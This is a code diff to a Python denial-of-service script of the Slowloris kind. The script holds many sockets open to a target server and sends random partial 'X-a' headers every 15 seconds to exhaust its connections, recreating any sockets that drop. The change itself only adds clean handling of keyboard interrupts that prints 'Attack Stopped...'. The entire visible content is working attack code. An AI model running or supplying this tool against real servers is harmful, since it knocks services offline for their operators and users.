@@ -109,22 +109,27 @@ def main():
         list_of_sockets.append(s)
 
     while True:
-        logging.info("Sending keep-alive headers... Socket count: %s", len(list_of_sockets))
-        for s in list(list_of_sockets):
-            try:
-                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
-            except socket.error:
-                list_of_sockets.remove(s)
-
-        for _ in range(socket_count - len(list_of_sockets)):
-            logging.debug("Recreating socket...")
-            try:
-                s = init_socket(ip)
-                if s:
-                    list_of_sockets.append(s)
-            except socket.error:
-                break
-        time.sleep(15)
+        try:
+            logging.info("Sending keep-alive headers... Socket count: %s", len(list_of_sockets))
+            for s in list(list_of_sockets):
+                try:
+                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+                except socket.error:
+                    list_of_sockets.remove(s)
+    
+            for _ in range(socket_count - len(list_of_sockets)):
+                logging.debug("Recreating socket...")
+                try:
+                    s = init_socket(ip)
+                    if s:
+                        list_of_sockets.append(s)
+                except socket.error:
+                    break
+            time.sleep(15)
+        
+        except (KeyboardInterrupt, SystemExit):
+            print("\nAttack Stopped...")
+            break
 
 if __name__ == "__main__":
     main()
